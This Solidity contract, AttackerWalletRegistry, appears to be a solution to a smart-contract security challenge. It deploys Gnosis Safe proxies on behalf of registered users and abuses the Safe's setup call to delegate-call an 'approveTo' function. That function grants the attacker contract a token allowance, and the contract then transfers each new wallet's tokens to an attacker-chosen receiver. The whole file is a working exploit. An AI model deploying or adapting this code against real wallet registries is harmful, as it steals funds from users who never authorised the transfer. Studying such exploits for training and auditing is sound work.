// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

import "hardhat/console.sol";

contract AttackerWalletRegistry {
    address public masterCopy;
    address public walletFactory;
    address public token;
    address public walletRegistry;

    constructor(
        address masterCopy_,
        address walletFactory_,
        address token_,
        address walletRegistry_
    ) {
        masterCopy = masterCopy_;
        walletFactory = walletFactory_;
        token = token_;
        walletRegistry = walletRegistry_;
    }

    // will be delegate-called
    function approveTo(
        address to,
        address token_,
        uint256 amount
    ) external {
        IERC20(token_).approve(to, amount);
    }

    function createProxy(
        address[] calldata users,
        uint256 tokenAmount,
        address tokenReceiver
    ) external {
        for (uint256 i = 0; i < users.length; ++i) {
            bytes memory encodedApprove = abi.encodeWithSignature(
                "approveTo(address,address,uint256)",
                address(this),
                token,
                tokenAmount
            );

            address[] memory owners = new address[](1);
            owners[0] = users[i];
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                encodedApprove,
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(walletFactory)
                .createProxyWithCallback(
                    masterCopy,
                    initializer,
                    0,
                    IProxyCreationCallback(walletRegistry)
                );

            IERC20(token).transferFrom(
                address(proxy),
                tokenReceiver,
                tokenAmount
            );
        }
    }
}
